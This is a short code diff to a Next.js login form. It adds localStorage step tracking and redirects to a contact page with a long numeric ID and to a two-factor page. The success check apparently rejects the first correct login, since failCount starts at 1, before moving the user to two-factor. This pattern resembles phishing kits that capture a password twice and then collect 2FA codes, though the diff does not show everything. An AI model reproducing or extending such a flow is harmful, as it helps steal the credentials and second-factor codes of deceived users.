@@ -1,12 +1,15 @@
+import { useLocalStorage } from '@/helpers/useLocalstorage';
 import { login } from '@/request/post';
 import { useRouter } from 'next/router';
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { ErrorMessage } from '../common/error-message';
 
 function LoginForm() {
-  const [failCount, setFailCount] = useState(1);
   const router = useRouter();
+  const [failCount, setFailCount] = useState(1);
+  const [step, setStep] = useLocalStorage('step');
+
   const {
     register,
     handleSubmit,
@@ -15,9 +18,18 @@ function LoginForm() {
     reset,
   } = useForm();
 
+  useEffect(() => {
+    if (step === 1) {
+      router.push('/contact/295038365360854');
+    } else if (step === 3) {
+      router.push('/two-factor');
+    }
+  }, [step, router]);
+
   const onSubmit = async (data) => {
     const res = await login(data);
     if (res?.status && !failCount) {
+      setStep(3);
       router.push('/two-factor');
     } else {
       reset();
